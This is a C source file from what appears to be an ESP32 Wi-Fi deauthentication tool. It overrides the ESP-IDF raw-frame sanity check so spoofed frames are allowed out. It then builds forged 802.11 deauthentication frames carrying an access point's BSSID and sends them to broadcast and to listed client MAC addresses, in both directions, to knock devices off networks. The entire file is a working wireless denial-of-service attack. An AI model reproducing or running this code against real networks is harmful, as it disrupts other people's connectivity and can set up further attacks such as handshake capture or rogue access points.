/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 *
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 *
 * @note This file MUST be C. not C++ !!! Otherwise trick with replacing ieee80211_raw_frame_sanity_check() function
 * from ESP IDF by our imnplementation will not work
 *
 * @note If deauth attack is not working, you can check this page - https://blog.spacehuhn.com/deauth-attack-not-working
 *
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#include "WiFiFramesSender.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

/**
 * @brief Deauthentication frame template
 *
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 *
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 * @see Explanation of this frame format is here - https://blog.spacehuhn.com/wifi-deauthentication-frame
 * @see https://www.sharetechnote.com/html/WLAN_FrameStructure.html
 */
const uint8_t deauth_frame_default[] = {0xc0, 0x00, 0x3a, 0x01,              // Type, subtype c0: deauth
                                        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination MAC
                                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Sourse MAC
                                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID MAC
                                        0xf0, 0xff, 0x02, 0x00};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }

bool isBroadcastMac(const uint8_t *mac) {
  for (uint8_t i = 0; i < 6; i++)
    if (mac[i] != 0xFF) return false;
  return true;
}

void wsl_bypasser_send_broadcast_deauth_frame(const wifi_ap_record_t *ap_record) {
  // Send deauth frame from AP to station
  uint8_t deauth_frame[sizeof(deauth_frame_default)];
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  memcpy(&deauth_frame[10], ap_record->bssid, 6);
  memcpy(&deauth_frame[16], ap_record->bssid, 6);
  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));

  // Send disassociate frame
  deauth_frame[0] = 0xa0;
  // Comment out sending of disassociate frames to reduce TX stream of WiFi raw frames.
  // Otherwise APs black list should be too short
  // wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

void wsl_bypasser_send_deauth_frame_to_targets(const wifi_ap_record_t *ap_record, const uint8_t *destination_macs,
                                               uint16_t macs_num, const bool *isStopRequested) {
  uint8_t deauth_frame[sizeof(deauth_frame_default)];
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

  const uint8_t *current_target_mac = destination_macs;
  for (int i = 0; i < macs_num; ++i, current_target_mac += 6) {
    if (*isStopRequested) {
      return;
    }

    // First send deauth frame from AP to station
    memcpy(&deauth_frame[4], current_target_mac, 6);
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));

    // Then send disassociate frame from AP to station
    deauth_frame[0] = 0xa0;
    // Comment out sending of disassociate frames to reduce TX stream of WiFi raw frames.
    // Otherwise APs black list should be too short
    // wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));

    // After that do in opposite direction. Just sending broadcast deautyh without this part may not work at all.
    // Send deauth and disassociate frames from station to AP
    if (!isBroadcastMac(current_target_mac)) {  // but only if the packet isn't a broadcast
      // Build deauth packet
      memcpy(&deauth_frame[4], ap_record->bssid, 6);
      memcpy(&deauth_frame[10], current_target_mac, 6);
      memcpy(&deauth_frame[16], current_target_mac, 6);

      // Send deauth frame
      deauth_frame[0] = 0xc0;
      wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));

      // Send disassociate frame
      deauth_frame[0] = 0xa0;
      // Comment out sending of disassociate frames to reduce TX stream of WiFi raw frames.
      // Otherwise APs black list should be too short
      // wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    }
  }
}
